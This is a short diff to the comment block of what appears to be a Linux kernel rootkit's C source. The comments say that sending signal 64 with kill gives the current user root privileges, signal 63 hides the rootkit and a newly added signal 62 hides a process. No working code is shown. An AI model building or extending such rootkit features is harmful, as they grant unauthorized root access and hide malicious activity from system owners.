@@ -19,7 +19,8 @@ int tamper_fd;
 
 /**
  * if signal is 64 then gives the current user root privilegs
- * if signale is 63 hides the rootkit
+ * if signal is 63 hides the rootkit
+ * if signal is 62 it hides the porcess
  * kill
 */
 //see http://www.kernel.org/doc/man-pages/online/pages/man2/kill.2.html
